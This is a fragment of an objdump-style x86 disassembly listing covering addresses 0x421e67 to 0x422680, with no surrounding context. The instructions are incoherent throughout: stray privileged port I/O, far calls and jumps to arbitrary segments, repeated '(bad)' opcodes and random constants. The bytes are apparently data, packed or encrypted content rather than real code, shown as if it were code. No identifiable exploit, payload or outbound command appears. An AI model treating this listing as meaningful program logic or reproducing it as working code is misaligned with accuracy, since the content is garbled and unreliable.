  421e67:	or     DWORD PTR [edi-0x5cd87532],ebp
  421e6d:	cli    
  421e6e:	mov    al,ds:0x3ea02b1e
  421e73:	or     DWORD PTR [eax-0x61900275],ebp
  421e79:	and    DWORD PTR [edx],edi
  421e7b:	mov    ds:0xa970d108,eax
  421e80:	sub    edx,ebx
  421e82:	cmp    edi,DWORD PTR [eax]
  421e84:	mov    ch,0x1a
  421e86:	xor    eax,0xdd8dc630
  421e8b:	ret    0x22b
  421e8e:	xor    eax,0x7e9ef971
  421e93:	repnz int3 
  421e95:	lds    ecx,FWORD PTR [ebp+0x6c]
  421e98:	scas   al,BYTE PTR es:[edi]
  421e99:	add    bh,ah
  421e9b:	lods   al,BYTE PTR ds:[esi]
  421e9c:	cli    
  421e9d:	frstor [eax-0x5c]
  421ea0:	call   ebp
  421ea2:	(bad)  
  421ea3:	sbb    DWORD PTR [edi],esp
  421ea5:	or     ebp,DWORD PTR [esp+esi*1-0x1b2ccc5e]
  421eac:	mov    bh,BYTE PTR [ebp-0x28]
  421eaf:	js     0x421e70
  421eb1:	cmp    ah,BYTE PTR ds:0x3d3bacc7
  421eb7:	mov    cs,WORD PTR [esi]
  421eb9:	jge    0x421e7f
  421ebb:	mov    esp,0xb054a0ee
  421ec0:	push   edi
  421ec1:	dec    ebp
  421ec2:	and    eax,0xdc266e64
  421ec7:	jg     0x421ec4
  421ec9:	push   cs
  421eca:	stc    
  421ecb:	add    DWORD PTR [ecx+edx*8+0x33a180f4],0x58
  421ed3:	or     BYTE PTR [esi+edi*4],bh
  421ed6:	iret   
  421ed7:	or     DWORD PTR [ebx+esi*2+0x5750a665],eax
  421ede:	and    eax,0x3fae897c
  421ee3:	gs pop edx
  421ee5:	in     al,0xcb
  421ee7:	les    ebx,FWORD PTR [edx+ebx*2+0x1a00b6bc]
  421eee:	imul   ebp,ebx,0x78
  421ef1:	sbb    eax,0x509a59a1
  421ef6:	lahf   
  421ef7:	stc    
  421ef8:	mov    edi,0x225dd18c
  421efd:	iret   
  421efe:	lds    esp,FWORD PTR [esi]
  421f00:	mov    esp,0x6b2f32e0
  421f05:	loopne 0x421f78
  421f07:	mov    ebx,DWORD PTR [ebx]
  421f09:	imul   eax,DWORD PTR [ecx-0x2e],0xffffff9b
  421f0d:	aaa    
  421f0e:	jno    0x421eea
  421f10:	jbe    0x421f34
  421f12:	sti    
  421f13:	sbb    al,BYTE PTR [edi]
  421f15:	pop    es
  421f16:	inc    ebp
  421f17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f18:	push   ebp
  421f19:	and    al,0xe
  421f1b:	mov    esi,0xb58b205a
  421f20:	outs   dx,DWORD PTR ds:[esi]
  421f21:	fidiv  DWORD PTR [esp+ebp*8]
  421f24:	ins    BYTE PTR es:[edi],dx
  421f25:	inc    edi
  421f26:	xchg   esi,eax
  421f27:	retf   0xdf51
  421f2a:	(bad)  
  421f2b:	jo     0x421f44
  421f2d:	jns    0x421f74
  421f2f:	jge    0x421f0f
  421f31:	cld    
  421f32:	(bad)  
  421f33:	call   0xd8088a5c
  421f38:	test   eax,0xbd0a35d6
  421f3d:	test   DWORD PTR [edx],0x262d48e8
  421f43:	xchg   edx,eax
  421f44:	in     eax,0xbd
  421f46:	les    esp,FWORD PTR [ebx+0x1daba71a]
  421f4c:	xor    DWORD PTR [ecx+ecx*1],0xffffffb9
  421f50:	outs   dx,BYTE PTR ds:[esi]
  421f51:	(bad)  
  421f52:	sar    BYTE PTR [edi],1
  421f54:	add    BYTE PTR [esi+0x73],ah
  421f57:	test   DWORD PTR [eax-0x41],0xa3005877
  421f5e:	repnz stc 
  421f60:	ret    0xab0a
  421f63:	mov    ebx,DWORD PTR [edi]
  421f65:	sub    BYTE PTR [edx+0x6b1f2a26],cl
  421f6b:	ret    0x34fd
  421f6e:	in     eax,dx
  421f6f:	cmp    ch,BYTE PTR [edx+ebx*1-0x56408756]
  421f76:	pop    esp
  421f77:	call   0x9fcc:0xba7606aa
  421f7e:	mov    BYTE PTR [esi],cl
  421f80:	loopne 0x421f0b
  421f82:	mov    edi,0xdd9947d
  421f87:	inc    esi
  421f88:	pop    ss
  421f89:	rol    DWORD PTR [eax+0x6c],0x38
  421f8d:	add    ah,BYTE PTR [ecx+0x66458256]
  421f93:	mov    ebp,0x7cb2c279
  421f98:	jge    0x422013
  421f9a:	pop    es
  421f9b:	rol    DWORD PTR [ebp+0x28],0xb9
  421f9f:	lods   al,BYTE PTR ds:[esi]
  421fa0:	dec    ebx
  421fa1:	les    esi,FWORD PTR [eax]
  421fa3:	aad    0xcf
  421fa5:	push   es
  421fa6:	push   0xdaaa5865
  421fab:	xor    eax,ebp
  421fad:	or     eax,0xb77b302a
  421fb2:	xchg   edi,eax
  421fb3:	dec    ebx
  421fb4:	std    
  421fb5:	cmp    edi,DWORD PTR [ebx+0x49862b8d]
  421fbb:	xchg   ebx,eax
  421fbc:	push   ecx
  421fbd:	aam    0x96
  421fbf:	test   al,0x41
  421fc1:	cld    
  421fc2:	xchg   edi,eax
  421fc3:	pushf  
  421fc4:	fcmovbe st,st(7)
  421fc6:	xor    ecx,ebp
  421fc8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421fc9:	mov    BYTE PTR [esi+0x5e454dd1],dl
  421fcf:	fldcw  WORD PTR [esi+0x5f]
  421fd2:	jle    0x421fb2
  421fd4:	push   es
  421fd5:	and    bp,si
  421fd8:	aas    
  421fd9:	jne    0x421f89
  421fdb:	outs   dx,BYTE PTR ds:[esi]
  421fdc:	sbb    DWORD PTR [eax-0x68dbc139],edi
  421fe2:	xor    al,0x2c
  421fe4:	rol    BYTE PTR [ebx-0x2b6630cf],cl
  421fea:	add    BYTE PTR [eax+0x6e],ah
  421fed:	loopne 0x421fa9
  421fef:	mov    bh,0xc1
  421ff1:	inc    ebx
  421ff2:	push   cs
  421ff3:	add    al,BYTE PTR [edi]
  421ff5:	lea    esp,[edi+0x193c2359]
  421ffb:	ins    BYTE PTR es:[edi],dx
  421ffc:	mov    bh,BYTE PTR [ebx]
  421ffe:	adc    BYTE PTR [edi+edx*4+0x58867ec3],0x16
  422006:	loope  0x421ff5
  422008:	inc    ecx
  422009:	call   0xf174:0x4ebc8aeb
  422010:	push   es
  422011:	or     edx,esi
  422013:	mov    al,BYTE PTR [ecx-0x27]
  422016:	mov    eax,ds:0xec3bfa54
  42201b:	retf   0x8d83
  42201e:	mov    ch,0x15
  422020:	push   esp
  422021:	aad    0xcc
  422023:	int3   
  422024:	cmp    DWORD PTR [ebp-0x79],esp
  422027:	pop    edi
  422028:	jno    0x421fe9
  42202a:	mov    esp,DWORD PTR [edi+0x58]
  42202d:	loopne 0x422062
  42202f:	popf   
  422030:	vshufps ymm4,ymm1,YMMWORD PTR [ebx+eax*2+0x9d3687f],0xd2
  42203a:	inc    ebp
  42203b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42203c:	in     eax,0x33
  42203e:	ror    BYTE PTR [ebp+0x75f1734e],1
  422044:	and    DWORD PTR [edx],edi
  422046:	ret    0xb06c
  422049:	enter  0xecfc,0xb0
  42204d:	mov    ah,0x7a
  42204f:	jo     0x42200c
  422051:	ss jmp 0x1983b9ff
  422057:	cmp    BYTE PTR [edx-0x2],0x92
  42205b:	fmul   DWORD PTR [edi]
  42205d:	sbb    edi,DWORD PTR [ecx]
  42205f:	mov    ebx,0xb8f5a150
  422064:	sbb    esp,DWORD PTR [ebx+0x6a]
  422067:	dec    edi
  422068:	mov    DWORD PTR [esi],ecx
  42206a:	and    ch,al
  42206c:	cli    
  42206d:	(bad)  
  42206e:	or     BYTE PTR fs:[eax+edx*8+0x53],0xf3
  422074:	xchg   ebp,eax
  422075:	loop   0x4220d2
  422077:	push   0x676a38f2
  42207c:	popa   
  42207d:	pop    ds
  42207e:	inc    edi
  42207f:	push   edi
  422080:	stos   BYTE PTR es:[edi],al
  422081:	shr    DWORD PTR [edi+0x54],0x37
  422085:	push   0x760ec6c0
  42208a:	pop    ss
  42208b:	sahf   
  42208c:	(bad)  
  42208d:	mov    bh,0x85
  42208f:	sbb    DWORD PTR [edx+0x64],ecx
  422092:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422093:	fadd   QWORD PTR [ebp+0x71]
  422096:	nop
  422097:	push   es
  422098:	lock mov bl,0xfa
  42209b:	and    al,0xbf
  42209d:	aam    0xee
  42209f:	add    BYTE PTR ds:0xeaffc833,0xf1
  4220a6:	fwait
  4220a7:	push   ss
  4220a8:	je     0x42205b
  4220aa:	clc    
  4220ab:	jns    0x422090
  4220ad:	fstp   DWORD PTR [ebp+0x6f6b3b08]
  4220b3:	jp     0x42207d
  4220b5:	pop    edi
  4220b6:	and    bh,dl
  4220b8:	mov    bh,0x5a
  4220ba:	jmp    0x4220bf
  4220bc:	pop    eax
  4220bd:	sub    ch,bl
  4220bf:	fidivr DWORD PTR [ebx]
  4220c1:	fdivr  QWORD PTR [edi+0x7fc7a139]
  4220c7:	aam    0x84
  4220c9:	inc    edi
  4220ca:	xor    ecx,ebp
  4220cc:	xchg   esi,eax
  4220cd:	push   edx
  4220ce:	xchg   esi,eax
  4220cf:	call   0x509ec11c
  4220d4:	add    al,dl
  4220d6:	rcr    ebx,cl
  4220d8:	add    ah,dh
  4220da:	sar    BYTE PTR [esi],1
  4220dc:	popf   
  4220dd:	xchg   ebx,eax
  4220de:	or     ch,0x43
  4220e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4220e2:	loop   0x42206c
  4220e4:	ror    ebp,0x85
  4220e7:	inc    ebp
  4220e8:	stc    
  4220e9:	adc    DWORD PTR [esi+0x62],eax
  4220ec:	xchg   ecx,eax
  4220ed:	lods   al,BYTE PTR ds:[esi]
  4220ee:	xchg   esi,eax
  4220ef:	mov    ch,0x95
  4220f1:	mov    bl,0xe4
  4220f3:	pcmpgtd mm4,QWORD PTR [esi+0x15cddace]
  4220fa:	xor    bh,dh
  4220fc:	mov    esi,0xe126238d
  422101:	push   esi
  422102:	imul   eax,DWORD PTR [eax*1+0x61189492],0xd41e02ca
  42210d:	and    BYTE PTR [edi],cl
  42210f:	adc    BYTE PTR [edx],dh
  422111:	ins    BYTE PTR es:[edi],dx
  422112:	mov    ch,0xb0
  422114:	dec    esi
  422115:	(bad)  [edi]
  422117:	mov    BYTE PTR [edi+ebx*2-0x50],ah
  42211b:	xchg   ebp,eax
  42211c:	or     DWORD PTR [edx+eax*1+0x72],esp
  422120:	sbb    eax,0x579d6670
  422125:	xchg   BYTE PTR [ebx+0x32],ch
  422128:	daa    
  422129:	test   BYTE PTR [esi],dh
  42212b:	add    DWORD PTR [eax],esp
  42212d:	push   ebx
  42212e:	int    0x67
  422130:	xchg   esi,eax
  422131:	jbe    0x42215f
  422133:	fldenv [edi]
  422135:	add    edx,esi
  422137:	lds    esp,FWORD PTR [eax]
  422139:	jne    0x422139
  42213b:	mov    ds:0xed1ea15e,eax
  422140:	push   cs
  422141:	idiv   esp
  422143:	call   0x1ac28252
  422148:	sub    ah,cl
  42214a:	dec    edi
  42214b:	mov    ebp,0x40abda34
  422150:	call   0xcb6f:0xa6631c64
  422157:	fidivr WORD PTR [edx]
  422159:	push   0x5
  42215b:	mov    bh,0xe2
  42215d:	sub    edi,esi
  42215f:	or     dl,bh
  422161:	push   cs
  422162:	mov    ch,0x51
  422164:	loope  0x422147
  422166:	int    0x34
  422168:	jmp    0xb09f:0x4c6e1f7
  42216f:	cwde   
  422170:	xchg   edx,eax
  422171:	adc    BYTE PTR [edi-0x7d],al
  422174:	or     bh,ch
  422176:	mov    ch,0x39
  422178:	or     DWORD PTR [ebp+0x2885e626],edi
  42217e:	dec    ebp
  42217f:	sbb    ah,BYTE PTR [esi+0x2a764277]
  422185:	add    al,0xd1
  422187:	in     eax,0xc1
  422189:	mov    eax,0xce31b4ab
  42218e:	jg     0x4221be
  422190:	fcmove st,st(4)
  422192:	test   eax,0xb7af5da9
  422197:	call   0xbd30:0x4b262fb
  42219e:	lea    eax,[ecx]
  4221a0:	jae    0x422167
  4221a2:	mul    DWORD PTR [eax-0x6e2a68b6]
  4221a8:	std    
  4221a9:	js     0x42218a
  4221ab:	sub    eax,0x8889c74
  4221b0:	repz add ecx,esi
  4221b3:	xchg   esp,eax
  4221b4:	xor    DWORD PTR [ebx+esi*8+0x51],0xffffffde
  4221b9:	xlat   BYTE PTR ds:[ebx]
  4221ba:	pop    eax
  4221bb:	mov    edx,0x33f8b829
  4221c0:	sbb    ah,bl
  4221c2:	mov    dl,0x7d
  4221c4:	enter  0xeb8e,0x2d
  4221c8:	in     al,0x33
  4221ca:	scas   eax,DWORD PTR es:[edi]
  4221cb:	xor    DWORD PTR [esi+0x59],ebx
  4221ce:	adc    eax,0x520561e2
  4221d3:	aam    0x5b
  4221d5:	dec    edx
  4221d6:	add    BYTE PTR [edi+0xb],ch
  4221d9:	push   cs
  4221da:	inc    esi
  4221db:	aaa    
  4221dc:	(bad)
  4221e1:	loope  0x422194
  4221e3:	rol    WORD PTR [eax+ebp*2+0x738b73f1],0x50
  4221ec:	xchg   ebp,eax
  4221ed:	loop   0x4221f4
  4221ef:	mov    dh,0x5d
  4221f1:	sti    
  4221f2:	aaa    
  4221f3:	out    0xd3,al
  4221f5:	push   edx
  4221f6:	loope  0x422274
  4221f8:	lock lods al,BYTE PTR ds:[esi]
  4221fa:	rcr    BYTE PTR [eax+eax*4-0x6669534d],1
  422201:	push   eax
  422202:	retf   
  422203:	pusha  
  422204:	jae    0x422198
  422206:	mov    esi,0x21da10e7
  42220b:	mov    al,ds:0x6a13f62
  422210:	gs xchg bh,dh
  422213:	jnp    0x422247
  422215:	mov    esi,0x4d467017
  42221a:	jl     0x4221ed
  42221c:	test   al,0x5b
  42221e:	mov    edx,0xbaebda67
  422223:	inc    esi
  422224:	adc    DWORD PTR [eax+0x3ba8df27],eax
  42222a:	jl     0x42227e
  42222c:	jge    0x42229c
  42222e:	pop    ebx
  42222f:	shl    bl,1
  422231:	add    al,0x97
  422233:	push   0xffffff96
  422235:	stos   BYTE PTR es:[edi],al
  422236:	xor    BYTE PTR [ebp+eax*1+0x1809f414],0x18
  42223e:	div    DWORD PTR [ecx-0x5f]
  422241:	out    0x4b,al
  422243:	fmul   st,st(2)
  422245:	and    DWORD PTR [ecx+ebp*4],0xffffffcf
  422249:	cdq    
  42224a:	stos   BYTE PTR es:[edi],al
  42224b:	nop
  42224c:	pop    esp
  42224d:	mov    esi,DWORD PTR [esi+edi*1+0x18]
  422251:	pop    ss
  422252:	lods   eax,DWORD PTR ds:[esi]
  422253:	xchg   esp,eax
  422254:	jge    0x42223f
  422256:	dec    esp
  422257:	cwde   
  422258:	shl    ah,1
  42225a:	and    eax,0x3250dcf
  42225f:	(bad)  
  422260:	xor    ebp,DWORD PTR ds:0x7feac082
  422266:	mov    esp,0x53beee4c
  42226b:	xchg   BYTE PTR [esi+0x1efcba8c],al
  422271:	mov    dl,0x5b
  422273:	dec    eax
  422274:	xor    edx,DWORD PTR [eax]
  422276:	in     eax,0xc1
  422278:	cmp    DWORD PTR [ebx+ebp*4-0xad77e0f],edi
  42227f:	pop    ecx
  422280:	js     0x4222da
  422282:	cli    
  422283:	pop    ebp
  422284:	xlat   BYTE PTR ds:[ebx]
  422285:	(bad)  
  422286:	dec    eax
  422287:	test   edi,eax
  422289:	std    
  42228a:	es ret 
  42228c:	aas    
  42228d:	mov    dh,0x59
  42228f:	imul   edi,DWORD PTR [esi-0x5],0xffffffa4
  422293:	sub    ebp,DWORD PTR [eax+esi*4-0x27656ff2]
  42229a:	xor    al,0xdc
  42229c:	fwait
  42229d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42229e:	and    BYTE PTR [edx+0x74faba88],cl
  4222a4:	int3   
  4222a5:	test   BYTE PTR [esi],al
  4222a7:	mov    DWORD PTR [eax],eax
  4222a9:	add    BYTE PTR [edx+0x44],al
  4222ac:	inc    ebx
  4222ad:	push   edi
  4222ae:	inc    edi
  4222af:	push   edi
  4222b0:	push   esi
  4222b1:	push   ebp
  4222b2:	outs   dx,DWORD PTR ds:[esi]
  4222b3:	pop    ebp
  4222b4:	mov    ds:0x6946e5dc,eax
  4222b9:	xor    eax,0x1b180
  4222be:	xchg   BYTE PTR [esi],al
  4222c0:	add    BYTE PTR [eax],al
  4222c2:	and    ebx,DWORD PTR [ecx]
  4222c4:	push   ebp
  4222c5:	retf   0x4c5d
  4222c8:	mov    BYTE PTR [eax+0x5a46f360],ch
  4222ce:	in     eax,dx
  4222cf:	or     edi,edx
  4222d1:	adc    esi,DWORD PTR [ebx-0x6692d4a3]
  4222d7:	das    
  4222d8:	dec    ebp
  4222d9:	mov    dl,0x39
  4222db:	mov    ds:0xc16f6748,eax
  4222e0:	sbb    eax,0xbc3782e4
  4222e5:	lock inc eax
  4222e7:	test   al,0xf2
  4222e9:	gs (bad) 
  4222eb:	pop    edx
  4222ec:	mov    ebx,ss
  4222ee:	cwde   
  4222ef:	ret    0x83d9
  4222f2:	mov    cl,0x7d
  4222f4:	xor    dl,BYTE PTR [edx]
  4222f6:	ins    DWORD PTR es:[edi],dx
  4222f7:	mov    esi,0x3b69e665
  4222fc:	mov    esp,DWORD PTR [eax-0xc]
  4222ff:	aam    0x49
  422301:	js     0x4222ff
  422303:	icebp  
  422304:	mov    al,0x74
  422306:	push   ebp
  422307:	push   ss
  422308:	popa   
  422309:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42230b:	stos   BYTE PTR es:[edi],al
  42230c:	lds    edi,FWORD PTR [eax]
  42230e:	call   0x16a4:0xf76b56
  422315:	retf   0xc7a1
  422318:	mov    ch,0x9b
  42231a:	ins    DWORD PTR es:[edi],dx
  42231b:	add    al,0x22
  42231d:	add    esp,DWORD PTR [eax+0xad1b082]
  422323:	mov    edi,DWORD PTR [eax+0x1a701481]
  422329:	int3   
  42232a:	mov    edx,0xa6d47e6
  42232f:	mov    ds:0xfecc0d89,eax
  422334:	lods   eax,DWORD PTR ds:[esi]
  422335:	or     ebp,DWORD PTR ss:[ebx+ebp*2]
  422339:	popa   
  42233a:	je     0x4222d1
  42233c:	lods   eax,DWORD PTR ds:[esi]
  42233d:	sub    ebp,DWORD PTR [edx+0x4700a3e]
  422343:	inc    ecx
  422344:	xor    ch,BYTE PTR [edi]
  422346:	cmp    dl,BYTE PTR ds:0x36ad2c67
  42234c:	imul   eax,edi,0x87ee85e5
  422352:	jg     0x4222ec
  422354:	ss dec esp
  422356:	or     DWORD PTR [edi+0x25],0x2fef4021
  42235d:	frstor [esi-0x7346b01b]
  422363:	(bad)  
  422365:	(bad)  
  422366:	ret    0xa3dd
  422369:	lock popf 
  42236b:	cdq    
  42236c:	jae    0x42238b
  42236e:	loope  0x422338
  422370:	out    dx,al
  422371:	fdivr  QWORD PTR [edi]
  422373:	aaa    
  422374:	xchg   edx,eax
  422376:	push   edi
  422377:	stos   BYTE PTR es:[edi],al
  422378:	test   eax,0xe9328baf
  42237d:	pop    ds
  42237e:	imul   BYTE PTR [ebx+ebp*2]
  422381:	mov    eax,0x12288208
  422386:	jmp    DWORD PTR [edi+0x120a6280]
  42238c:	mov    ds:0x8eb0dc06,al
  422391:	aas    
  422392:	push   ebp
  422393:	push   ecx
  422394:	xor    BYTE PTR [esp+ebp*1],dh
  422397:	jne    0x422403
  422399:	jmp    0x20e5:0x91bac86a
  4223a0:	mov    WORD PTR [esi-0x45dbe70c],cs
  4223a6:	mov    ebx,DWORD PTR [ebp-0x68d7c1f1]
  4223ac:	or     eax,0xfa246117
  4223b1:	pop    esp
  4223b2:	out    0xcb,eax
  4223b4:	xchg   ebp,eax
  4223b5:	enter  0xa406,0x4e
  4223b9:	add    eax,0xa3b7dacd
  4223be:	fistp  QWORD PTR [ecx-0x5655bcc2]
  4223c4:	jnp    0x4223c2
  4223c6:	or     BYTE PTR [ecx+0x214e1f52],ch
  4223cc:	not    BYTE PTR ds:0x56fb77fb
  4223d2:	cmp    eax,0x31d9e0a4
  4223d7:	out    0x66,al
  4223d9:	cmp    eax,0xe08b23f7
  4223de:	cmp    eax,0x2a7e2cf8
  4223e3:	pop    ecx
  4223e4:	imul   esp,DWORD PTR [eax-0x5c],0x28
  4223e8:	mov    edx,0x12ff05a1
  4223ed:	pop    esp
  4223ee:	fwait
  4223ef:	int3   
  4223f0:	ins    BYTE PTR es:[edi],dx
  4223f1:	dec    edi
  4223f2:	xor    al,0x13
  4223f4:	cs enter 0x1d3b,0xf7
  4223f9:	inc    edi
  4223fa:	outs   dx,DWORD PTR ds:[esi]
  4223fb:	div    BYTE PTR [esi+0x23]
  4223fe:	jns    0x42238a
  422400:	xor    dl,BYTE PTR [ebx+0x22]
  422403:	std    
  422404:	inc    ecx
  422405:	push   0xffffffb3
  422407:	or     al,0x59
  422409:	ins    DWORD PTR es:[edi],dx
  42240a:	mov    ebp,DWORD PTR [ebx+0x2f5239d4]
  422410:	mov    esp,0xf9ec9b1b
  422415:	jp     0x422451
  422417:	jg     0x422435
  422419:	jle    0x422449
  42241b:	cs aaa 
  42241d:	xchg   edx,eax
  42241e:	inc    esi
  42241f:	in     eax,dx
  422420:	pop    ds
  422421:	cmp    dl,BYTE PTR [esi]
  422423:	mov    edi,DWORD PTR [ebx+0x67]
  422426:	sbb    al,BYTE PTR [ebx*8+0x31e67c0]
  42242d:	jo     0x4224a6
  42242f:	ins    DWORD PTR es:[edi],dx
  422430:	push   esi
  422431:	dec    esp
  422432:	mov    al,0xf
  422434:	xor    edi,DWORD PTR [edx+0x58d84e76]
  42243a:	outs   dx,BYTE PTR ds:[esi]
  42243b:	xchg   esi,eax
  42243c:	dec    edx
  42243d:	dec    eax
  42243e:	adc    ebx,DWORD PTR [esi-0x2cdb3f34]
  422444:	neg    BYTE PTR [esi-0x48819d08]
  42244a:	(bad)  
  42244b:	jmp    0x8d81:0x5431b30b
  422452:	iret   
  422453:	clc    
  422454:	das    
  422455:	test   eax,0x4b023116
  42245a:	les    ebx,FWORD PTR [ebx+0x1e]
  42245d:	mov    BYTE PTR [edi+0x73],bl
  422460:	fist   WORD PTR [ebx+0x7ae4fc59]
  422466:	and    al,0xbb
  422468:	add    BYTE PTR [esi+0x4ec5cfc1],bh
  42246e:	cli    
  42246f:	out    0xc3,al
  422471:	imul   BYTE PTR [ebx+ecx*1-0x58786c85]
  422478:	push   ds
  422479:	cmc    
  42247a:	pop    es
  42247b:	scas   al,BYTE PTR es:[edi]
  42247c:	std    
  42247d:	fsubp  st(7),st
  42247f:	je     0x422425
  422481:	fidiv  DWORD PTR [esi+0x357ecc8f]
  422487:	out    0x18,eax
  422489:	pop    ss
  42248a:	aas    
  42248b:	cmp    edx,DWORD PTR [esi]
  42248d:	add    esp,DWORD PTR [ebp+0x21e700b3]
  422493:	loop   0x422487
  422495:	lahf   
  422496:	lods   eax,DWORD PTR ds:[esi]
  422497:	mov    ah,0xe9
  422499:	mov    al,0xf3
  42249b:	repnz fiadd DWORD PTR ds:0xe4e5caab
  4224a2:	(bad)  [edi+0x5]
  4224a5:	js     0x42243b
  4224a7:	inc    DWORD PTR [edi-0x79]
  4224aa:	jo     0x4224c2
  4224ac:	mov    esi,0xfd27d69f
  4224b1:	jae    0x4224b5
  4224b3:	adc    al,0x21
  4224b5:	or     DWORD PTR [eax+0x757c1d24],esp
  4224bb:	pushf  
  4224bc:	push   esp
  4224bd:	ficom  DWORD PTR [eax+0x66bfa41c]
  4224c3:	mov    ah,0x34
  4224c5:	retf   
  4224c6:	push   edi
  4224c7:	mov    ah,0x56
  4224c9:	and    DWORD PTR [esi-0x4],0x2cac80a0
  4224d0:	outs   dx,DWORD PTR ds:[esi]
  4224d1:	out    0xda,eax
  4224d3:	bound  esi,QWORD PTR [edi+edi*2+0x11]
  4224d7:	push   ebp
  4224d8:	dec    ebx
  4224d9:	xchg   ecx,eax
  4224da:	gs add eax,0xed823287
  4224e0:	add    eax,0x96687764
  4224e5:	js     0x422479
  4224e7:	mov    eax,ds:0x8d4928a5
  4224ec:	mov    edi,0x2146f811
  4224f1:	mov    ebx,0x2a3c4dc7
  4224f6:	jae    0x422489
  4224f8:	lods   al,BYTE PTR ds:[esi]
  4224f9:	call   0x9e6f:0x76261023
  422500:	retf   
  422501:	ja     0x4224f9
  422503:	enterw 0x8485,0x9a
  422508:	inc    esp
  422509:	mov    dl,0x80
  42250b:	jae    0x42257d
  42250d:	ror    DWORD PTR [ecx-0x5fa60841],0xa4
  422514:	jmp    0x6a4154ef
  422519:	cmc    
  42251a:	fild   WORD PTR [eax-0xb945a84]
  422520:	or     al,0xfb
  422522:	mov    dl,0x4d
  422524:	push   cs
  422525:	jns    0x422502
  422527:	imul   ecx,DWORD PTR [ebx],0x5a18d633
  42252d:	test   eax,0x97c6d664
  422532:	pop    ds
  422533:	inc    eax
  422534:	int    0xec
  422536:	lds    ebx,FWORD PTR [esi]
  422538:	cli    
  422539:	popf   
  42253a:	and    bh,BYTE PTR [edi+0x47d4ef74]
  422540:	pop    ds
  422541:	cwde   
  422542:	lods   eax,DWORD PTR ds:[esi]
  422543:	lds    ebp,FWORD PTR [esi+0x6fa01b15]
  422549:	outs   dx,BYTE PTR ds:[esi]
  42254a:	test   al,0x26
  42254c:	out    0xaa,eax
  42254e:	outs   dx,BYTE PTR ds:[esi]
  42254f:	(bad)  
  422550:	daa    
  422551:	dec    ecx
  422552:	jne    0x422581
  422554:	fisub  DWORD PTR [esi-0x32]
  422557:	push   ebx
  422558:	sbb    ebp,esi
  42255a:	call   0xe02:0xeba94374
  422561:	jb     0x42259a
  422563:	push   esi
  422564:	je     0x422566
  422566:	fisttp WORD PTR [edx+0x52]
  422569:	mov    al,ds:0x397b1328
  42256e:	dec    eax
  42256f:	iret   
  422570:	xchg   DWORD PTR [eax+eax*2],ebp
  422573:	mov    ah,0x2b
  422575:	mov    al,ds:0x6332e126
  42257a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42257b:	push   cs
  42257c:	mov    bh,dh
  42257e:	fwait
  42257f:	push   esi
  422580:	and    ah,BYTE PTR [eax+eiz*8+0x26d65a48]
  422587:	seto   BYTE PTR [edx]
  42258a:	mov    esi,0x3f844649
  42258f:	je     0x422565
  422591:	pop    ecx
  422592:	test   BYTE PTR [ecx],ch
  422594:	mov    ah,0xfe
  422596:	or     esi,DWORD PTR [edx+0x50c453d8]
  42259c:	enter  0x7e64,0x91
  4225a0:	lea    esi,[edx+0x27f41031]
  4225a6:	pushf  
  4225a7:	imul   edi,DWORD PTR [edi+esi*8],0x81cc009b
  4225ae:	jns    0x4225c6
  4225b0:	mov    edi,0x8d343d90
  4225b5:	and    al,0x19
  4225b7:	or     DWORD PTR [ebx+0x466219c9],0x7c3b459b
  4225c1:	pop    ss
  4225c2:	mov    edx,0x52c5b62e
  4225c7:	inc    edi
  4225c8:	or     ch,dl
  4225ca:	and    al,bh
  4225cc:	push   0xffffffb5
  4225ce:	pop    eax
  4225cf:	std    
  4225d0:	mov    eax,0x844df0b7
  4225d5:	mov    bh,0xf7
  4225d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225d8:	sub    esp,ecx
  4225da:	fucomi st,st(5)
  4225dc:	(bad)  [ebx]
  4225de:	mov    ch,BYTE PTR [eax*2+0x3ae1b493]
  4225e5:	xchg   esp,eax
  4225e6:	(bad)  
  4225e7:	push   edx
  4225e8:	or     al,dh
  4225ea:	push   ecx
  4225eb:	enter  0xd16e,0xc4
  4225ef:	push   ebp
  4225f0:	xchg   edi,eax
  4225f1:	adc    cl,BYTE PTR [eax+0x539a043]
  4225f7:	test   DWORD PTR [edi+0x7],ebp
  4225fa:	inc    esi
  4225fb:	sub    dh,BYTE PTR [edi-0x7c]
  4225fe:	mov    al,ds:0x2bd2ab10
  422603:	rcr    ebp,1
  422605:	adc    esi,ebp
  422607:	ss inc ecx
  422609:	jnp    0x422599
  42260b:	xchg   ebp,eax
  42260c:	cmp    DWORD PTR [ebp+0x41cb0b9b],edx
  422612:	push   ebp
  422613:	test   eax,0xf7483608
  422618:	aad    0xc4
  42261a:	xor    DWORD PTR [esi+0x78],ebp
  42261d:	data16 mov ch,0xb6
  422620:	ret    
  422621:	loopne 0x42268e
  422623:	cmp    ah,BYTE PTR [ebx]
  422625:	test   al,0xc8
  422627:	js     0x4225aa
  422629:	sti    
  42262a:	inc    ebp
  42262b:	mov    WORD PTR [ebx-0x2dda8f7d],gs
  422631:	sbb    BYTE PTR [edx],bh
  422633:	or     bl,BYTE PTR [esi+eax*1+0x1111d382]
  42263a:	jecxz  0x4226b8
  42263c:	push   cs
  42263d:	dec    esp
  42263e:	in     eax,0xcf
  422640:	mov    ah,BYTE PTR [edi+0x7f]
  422643:	iret   
  422644:	push   eax
  422645:	push   0xffffffdc
  422647:	xchg   ecx,eax
  422648:	popf   
  422649:	sbb    ecx,ebx
  42264b:	jnp    0x422662
  42264d:	(bad)  
  42264e:	(bad)  
  42264f:	and    BYTE PTR [ecx-0x54],bl
  422652:	inc    edi
  422653:	lods   eax,DWORD PTR ds:[esi]
  422654:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422655:	add    DWORD PTR [ebp+0x663f2bc2],ecx
  42265b:	sbb    al,0x86
  42265d:	mov    al,ds:0xde4c2c9d
  422662:	aad    0x7f
  422664:	idiv   cl
  422666:	dec    edx
  422667:	jmp    0x11f97c4c
  42266c:	pop    ds
  42266d:	fidiv  DWORD PTR [edx]
  42266f:	sub    DWORD PTR ds:0x7f2bc7ef,edx
  422675:	cmp    eax,0x4f565bc2
  42267a:	sub    DWORD PTR [esi+0xbcfdd8d],ebp
  422680:	jmp    0x6ec6d64f
